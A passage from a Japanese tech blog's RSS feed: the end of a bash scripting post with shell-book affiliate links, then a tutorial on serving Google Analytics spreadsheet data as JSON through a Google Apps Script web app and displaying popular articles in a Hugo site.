&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>bash-5.1$ bash tmp
面積は : 200
bash-5.1$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>戻り値について&lt;/dt>
&lt;dd>bashシェルスクリプトには「戻り値」というものは基本的に存在しない。&lt;/dd>
&lt;dd>
&lt;p>解決策として関数やコマンドの「実行結果を直接変数に代入する」という手段をとることになる。&lt;/p>
&lt;/dd>
&lt;dd>「return」コマンドは存在するが、あくまで終了ステータスを返しているだけで、関数の戻り値を返す機能ではないので注意しよう。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>GASとアナリティクスで、Hugoに人気記事を表示させる</title><link>https://suzukiiichiro.github.io/posts/2022-01-07-01-wyoshi/</link><pubDate>Fri, 07 Jan 2022 11:54:15 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-07-01-wyoshi/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-07-01-wyoshi/analytics.jpg" alt="Featured image of post GASとアナリティクスで、Hugoに人気記事を表示させる" />&lt;p>簡単にできるHugoで人気の記事を表示する方法の2回目になります。&lt;br>
&lt;a class="link" href="https://suzukiiichiro.github.io/posts/2022-01-06-01-wyoshi/" >前回（簡単にできるHugoで人気の記事を表示する方法 #01）&lt;/a>ではGAS（Google App Scripts）を使ってアナリティクスのデータをスプレッドシートに反映するところまで説明しました。&lt;br>
今回は前回作成したスプレッドシートからデータを取得して、Hugoと連携するところまでやっていきましょう。&lt;/p>
&lt;h2 id="スプレッドシートのデータをjsonで取得">スプレッドシートのデータをJSONで取得&lt;/h2>
&lt;p>Hugoやjsなどとの連携を簡単にするために、スプレッドシートのデータをjsonで取得できるようにします。&lt;/p>
&lt;p>前回作成したプログラムを開きます。&lt;br>
開き方は前回の「&lt;a class="link" href="https://suzukiiichiro.github.io/posts/2022-01-06-01-wyoshi/" >簡単にできるHugoで人気の記事を表示する方法 #01&lt;/a>」にある「スプレッドシートの設定」を確認してください。&lt;/p>
&lt;p>スプレッドシートのデータをjsonで取得するためには、APIを使用するケースもありますが、今回はAPIを使用しないで取得します。&lt;/p>
&lt;p>プログラムの内容は下記になります。&lt;/p>
&lt;p>スプレッドシートのIDはスプレッドシートのURL部分の&lt;br>
docs.google.com/spreadsheets/d/ &lt;code>スプレッドシートのID&lt;/code> /edit#gid=0&lt;br>
といったように docs.google.com/spreadsheets/d/ と edit に囲まれた部分になります。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="kd">function&lt;/span> &lt;span class="nx">getData&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">sheetName&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">sheet&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">SpreadsheetApp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">openById&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;スプレッドシートのID&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">getSheetByName&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">sheetName&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">rows&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">sheet&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getDataRange&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="nx">getValues&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">keys&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">rows&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">splice&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">)[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">rows&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">map&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">row&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kd">let&lt;/span> &lt;span class="nx">obj&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{};&lt;/span>
&lt;span class="nx">row&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">map&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">item&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">index&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="nx">obj&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">keys&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">index&lt;/span>&lt;span class="p">]]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">item&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">obj&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">function&lt;/span> &lt;span class="nx">doGet&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kd">let&lt;/span> &lt;span class="nx">data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">getData&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">parameter&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">sheetname&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">ContentService&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">createTextOutput&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">JSON&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">stringify&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">data&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">)).&lt;/span>&lt;span class="nx">setMimeType&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ContentService&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">MimeType&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">JSON&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="プログラムの説明">プログラムの説明&lt;/h3>
&lt;h4 id="dogetってなに">doGetってなに？&lt;/h4>
&lt;p>&lt;code>doGet(e)&lt;/code> はこのプログラムをURLから実行できるようにした際にパラメータの値を取得して処理を行う関数です。&lt;br>
ここでは &lt;code>getData()&lt;/code>という関数に、クエリパラメータ&lt;code>sheetname&lt;/code>を渡しております。&lt;br>
URLにすると、https://〜/exec?sheetname=パラメータ&lt;br>
となります。&lt;/p>
&lt;p>このパラメータ部分にスプレッドシートのシート名を渡すことで、該当するスプレッドシートのデータを表示できるようになるというわけです。&lt;/p>
&lt;h4 id="getdataでやってること">getDataでやってること&lt;/h4>
&lt;p>&lt;code>getData(sheetName)&lt;/code> では先程のクエリパラメータ&lt;code>sheetname&lt;/code>の値を使って、シートから情報を取得してjsonに格納している部分です。&lt;/p>
&lt;p>指定したシートIDの値がある範囲からから値を取得するのが下記のプログラムです。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="kr">const&lt;/span> &lt;span class="nx">rows&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">sheet&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getDataRange&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="nx">getValues&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>その取得した値からタイトル、jsonのキーとなる部分を keys として格納します。&lt;br>
そしたら先程取得した rows の値をループで取得しながらjson形式のデータに加工します。&lt;/p>
&lt;p>すると、&lt;/p>
&lt;pre tabindex="0">&lt;code>[
[リンク, pv数, session数, users数],
[リンク, pv数, session数, users数]
]
&lt;/code>&lt;/pre>&lt;p>というデータが&lt;/p>
&lt;pre tabindex="0">&lt;code>[
{link: リンク, pv: pv数, session: session数, users: users数},
{link: リンク, pv: pv数, session: session数, users: users数}
]
&lt;/code>&lt;/pre>&lt;p>というjson形式に加工することができました。&lt;br>
ここまでを保存しておきます。&lt;/p>
&lt;p>このプログラムを公開してURLでアクセスできるようにしましょう。&lt;/p>
&lt;h2 id="gasのプログラムをデプロイして公開">GASのプログラムをデプロイして公開&lt;/h2>
&lt;p>それではここまでのファイルをデプロイして、Webでアクセスできるようにしましょう。&lt;br>
右上にある「デプロイ」を押して、新しいデプロイをクリックします。&lt;/p>
&lt;p>すると、「新しいデプロイ」となるので、歯車のマーク「デプロイを有効にする」をおして、「ウェブアプリ」を選択します。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 139;
flex-basis: 335px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-07-01-wyoshi/img01.png" data-size="980x701">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-07-01-wyoshi/img01.png"
width="980"
height="701"
loading="lazy"
alt="GASとアナリティクスで、Hugoに人気記事を表示させるの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>設定の画面になるので、説明などを入力します。&lt;br>
「次のユーザーとして実行」は自身のアドレスでかまいません。&lt;br>
「アクセスできるよユーザー」部分は「 &lt;strong>全員&lt;/strong> 」とします。&lt;br>
これによって、Hugoから呼び出した際に実行できるようになります。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 139;
flex-basis: 333px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-07-01-wyoshi/img02.png" data-size="980x705">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-07-01-wyoshi/img02.png"
width="980"
height="705"
loading="lazy"
alt="GASとアナリティクスで、Hugoに人気記事を表示させるの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>ここまで設定できたら「デプロイ」を押して、プログラムを公開します。&lt;br>
表示されたウェブアプリのURLが表示されるので、コピーしておきます。&lt;/p>
&lt;p>先程コピーしたURLの末尾に&lt;code>?sheetname=month&lt;/code>を追加してアクセスしてみましょう。&lt;br>
&lt;a class="link" href="https://script.google.com/macros/s/" target="_blank" rel="noopener"
>https://script.google.com/macros/s/&lt;/a>〜/exec?sheetname=month&lt;br>
URLはこのような形になります。&lt;/p>
&lt;p>正常にアクセスできていれば&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 196;
flex-basis: 470px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-07-01-wyoshi/img03.png" data-size="980x500">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-07-01-wyoshi/img03.png"
width="980"
height="500"
loading="lazy"
alt="GASとアナリティクスで、Hugoに人気記事を表示させるの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;br>
とjson形式のデータが表示されるはずです。&lt;/p>
&lt;h3 id="エラーが出た場合">エラーが出た場合&lt;/h3>
&lt;pre tabindex="0">&lt;code>TypeError: Cannot read property 'getDataRange' of null（行 3、ファイル「コード」）
&lt;/code>&lt;/pre>&lt;p>というエラーが出た場合はパラメータが記述されていないだけなので、パラメータを記述することで正常に取得できます。&lt;br>
それ以外の場合は、「デバッグ」を使ってエラーを特定していく必要があります。&lt;br>
デバッグでは&lt;code>doGet&lt;/code>はクエリ取得できないので、&lt;code>e.parameter.sheetname&lt;/code>部分を&lt;code>&amp;quot;month&amp;quot;&lt;/code>と直書きしてデバッグを実行します。&lt;/p>
&lt;h4 id="デプロイには注意">デプロイには注意&lt;/h4>
&lt;p>デプロイで「新しいデプロイ」を選択するとURLが変わる点に注意です。&lt;br>
GASでウェブアプリのURLを固定するための方法は、「デプロイを管理」から更新をするようにします。&lt;/p>
&lt;ul>
&lt;li>「デプロイ」の「デプロイを管理」を押します。&lt;/li>
&lt;li>そして、右にある鉛筆マークの「編集」を押します。&lt;br>
すると、編集画面になり、バージョンや説明を修正することができます。&lt;/li>
&lt;li>バージョン部分を「新しいバージョン」として、説明に「最新版」とでも打っておきましょう。&lt;/li>
&lt;li>この状態で「デプロイ」をクリックします。&lt;/li>
&lt;/ul>
&lt;p>上記の作業で、URLを固定したままウェブアプリを公開することができます。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 138;
flex-basis: 333px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-07-01-wyoshi/img04.png" data-size="980x706">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-07-01-wyoshi/img04.png"
width="980"
height="706"
loading="lazy"
alt="GASとアナリティクスで、Hugoに人気記事を表示させるの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;h2 id="hugoと連携して人気の記事を表示する">Hugoと連携して人気の記事を表示する&lt;/h2>
&lt;p>アナリティクスとスプレッドシートを使って人気の記事をjsonで取得する事ができるようになったので、Hugoと連携します。&lt;br>
Hugoにはjsonを取得する機能がついているので、その機能を使ってデータを取得します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-html:popularArticlesMonth.html" data-lang="html:popularArticlesMonth.html">{{ $json := getJSON &amp;#34;https://script.google.com/macros/s/〜/exec?sheetname=month&amp;#34; }}
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">aside&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;widget archives sidearticle-contents--wrapper&amp;#34;&lt;/span> &lt;span class="na">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;popular-articles--month&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;contents-area&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">header&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;&lt;/span>&lt;span class="nt">h2&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;section-title&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>人気の記事（1ヶ月以内）&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">h2&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="nt">header&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;sidearticle-contents&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;flex article-list--tile&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
{{ $page := .Site.Pages }}
{{ range first .Site.Params.widgets.populerArticles.limit $json }}
{{ $article := index (where $page &amp;#34;.RelPermalink&amp;#34; &amp;#34;eq&amp;#34; .link ) 0 }}
{{ if $article }}
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">article&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">h3&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;article-title&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;&lt;/span>&lt;span class="nt">a&lt;/span> &lt;span class="na">href&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;{{ $article.RelPermalink }}&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>{{- $article.Title -}}&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">a&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="nt">h3&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">article&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
{{ end }}
{{ end }}
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">aside&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>getJSON&lt;/code> のURLは先ほど作成したGASのウェブアプリURLになります。&lt;br>
今回は月間の人気記事を取得したいので、&lt;code>?sheetname=month&lt;/code>としてあります。&lt;br>
年の場合は&lt;code>year&lt;/code>日の場合は&lt;code>day&lt;/code>などとすることで必要な情報を取得できます。&lt;/p>
&lt;p>使用しているテンプレートにも夜と思いますが、layouts/partials/widget/popularArticlesMonth.html として保存しておきましょう。&lt;/p>
&lt;p>このファイルをHugoで読み込むことで人気の記事を表示する事ができるようになります。&lt;/p>
&lt;p>取得する人気の記事件数は&lt;code>config.yaml&lt;/code>などのhugoの設定ファイル内のwidhetsに&lt;code>populerArticles&lt;/code>を追加して記述しておきます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml:config.yaml" data-lang="yaml:config.yaml">&lt;span class="w"> &lt;/span>&lt;span class="nt">widgets&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">enabled&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">popular-articles&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">populerArticles&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">limit&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="m">10&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="人気の記事を表示するプログラムの解説">人気の記事を表示するプログラムの解説&lt;/h3>
&lt;p>まずはサイト全体の記事を取得しておきます。&lt;/p>
&lt;pre tabindex="0">&lt;code>{{ $page := .Site.Pages }}
&lt;/code>&lt;/pre>&lt;p>次に、取得したjsonのデータを設定で指定した範囲で取得します。&lt;/p>
&lt;pre tabindex="0">&lt;code>{{ range first .Site.Params.widgets.populerArticles.limit $json }}
...
{{ end }}
&lt;/code>&lt;/pre>&lt;p>取得したデータからリンクに一致する記事を探します。&lt;br>
配列のデータで検索されているので、&lt;code>index&lt;/code>を使って0番目の記事を取得しています。&lt;br>
あとは通常の記事と同じように扱えます。&lt;/p>
&lt;pre tabindex="0">&lt;code>{{ $article := index (where $page &amp;quot;.RelPermalink&amp;quot; &amp;quot;eq&amp;quot; .link ) 0 }}
&lt;/code>&lt;/pre>&lt;p>今回は画像無しでタイトルのみの表示となりますが、データ自体は他の記事と同じなので画像やカテゴリ、本文などにもアクセス可能です。&lt;/p>
&lt;h2 id="自動更新の設定">自動更新の設定&lt;/h2>
&lt;p>サイトに人気の記事を表示させることができました。&lt;br>
今の設定だと人気の記事が更新されないので、GASの「トリガー」を使って定期的にアナリティクスのデータをjsonに反映するようにしておきます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="kd">function&lt;/span> &lt;span class="nx">setMonth&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">getGoogleAnalytics&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;month&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">function&lt;/span> &lt;span class="nx">setDay&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">getGoogleAnalytics&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;day&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">function&lt;/span> &lt;span class="nx">setYear&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">getGoogleAnalytics&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;year&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">function&lt;/span> &lt;span class="nx">all&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">setDay&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="nx">setMonth&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="nx">setYear&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>月だけでなく、日、年のデータも取得する夜にしておきます。&lt;br>
そして、それらをすべて実行する関数「all」も追加しておきましょう。ここで保存しておきます。&lt;br>
これで準備ができました。&lt;/p>
&lt;p>左袖にあるストップウォッチアイコンを押して、「トリガー」を追加します。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 145;
flex-basis: 348px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-07-01-wyoshi/img05.png" data-size="980x674">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-07-01-wyoshi/img05.png"
width="980"
height="674"
loading="lazy"
alt="GASとアナリティクスで、Hugoに人気記事を表示させるの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;ul>
&lt;li>「トリガーを追加」を押して、「実行する関数」で実行したい関数を選びます。今回は月間のデータを取得したいので「setMonth」を選択します。&lt;/li>
&lt;li>「実行するデプロイを選択」は「Head」のままで構いません。&lt;/li>
